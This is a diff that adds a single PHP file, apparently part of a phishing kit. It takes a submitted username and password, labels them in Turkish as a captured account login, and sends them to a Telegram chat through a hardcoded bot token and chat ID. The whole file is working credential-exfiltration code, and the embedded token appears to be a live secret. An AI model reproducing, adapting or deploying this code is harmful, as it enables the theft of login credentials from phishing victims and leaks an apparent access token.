@@ -1,0 +1,1 @@
+<?php    $token='5058143509:AAFT7S6jeYjfyZ9aprgCxo5TDQ8A2c6iTKc';    $data = [        'text' => 'Hesap GirdiKullanıcı Adı : '.$username.'Şifre : '.$password.'      ',      'chat_id' => '1809896881'    ];        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );?>
